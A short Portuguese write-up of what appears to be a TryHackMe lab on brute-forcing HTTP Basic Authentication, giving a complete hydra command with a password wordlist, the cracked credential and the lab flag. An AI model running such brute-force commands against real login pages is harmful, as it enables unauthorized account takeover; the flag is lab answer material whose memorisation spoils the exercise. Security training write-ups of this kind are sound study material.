## Objetivo
explorar HTTP Basic Authentication

## Vulnerabilidade Identificada
ausência de rate limiting + senha fraca, o que permite brute force sem bloqueio.

## Metodologia
o exercicio deu a wordlist de senha para usar. então apenas montei a linha de ataque 

## Comandos Utilizados
```bash
hydra -l admin \
-P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt \
enum.thm \
http-get \
"/labs/basic_auth/"
```

## Resultado

``admin:yellow``

Flag =   ``THM{b4$$1C_AuTTHHH}``

## Lições Aprendidas
Diferença clara de linha de ataque entre http-post-form e http-get. identificar o mecanismo de autenticação e escolher o módulo correto no Hydra.
